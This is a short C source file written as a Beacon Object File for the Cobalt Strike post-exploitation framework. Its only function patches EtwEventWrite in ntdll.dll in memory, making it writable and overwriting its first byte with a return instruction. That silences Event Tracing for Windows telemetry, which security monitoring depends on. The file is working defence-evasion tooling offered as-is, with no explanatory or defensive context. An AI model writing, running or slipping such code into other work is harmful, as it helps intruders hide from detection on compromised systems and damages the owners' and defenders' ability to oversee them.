#include <windows.h>
#include "beacon.h"
extern PVOID __imp_GetModuleHandleA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_VirtualProtect;
extern PVOID __imp_RtlCopyMemory;
void go(char *a,int l){
    BeaconPrintf(CALLBACK_OUTPUT,"[ETW] patching...\n");
    HMODULE ntdll=(HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_GetModuleHandleA)("ntdll.dll");
    if(!ntdll)return;
    FARPROC ew=(FARPROC)((FARPROC(WINAPI*)(HMODULE,LPCSTR))__imp_GetProcAddress)(ntdll,"EtwEventWrite");
    if(!ew)return;
    DWORD old;
    if(((BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD,PDWORD))__imp_VirtualProtect)(ew,1,PAGE_EXECUTE_READWRITE,&old)){
        BYTE ret[]={0xC3};  // ret
        ((void(WINAPI*)(PVOID,PVOID,SIZE_T))__imp_RtlCopyMemory)(ew,ret,1);
        ((BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD,PDWORD))__imp_VirtualProtect)(ew,1,old,&old);
        BeaconPrintf(CALLBACK_OUTPUT,"[ETW] patched\n");
    }
}
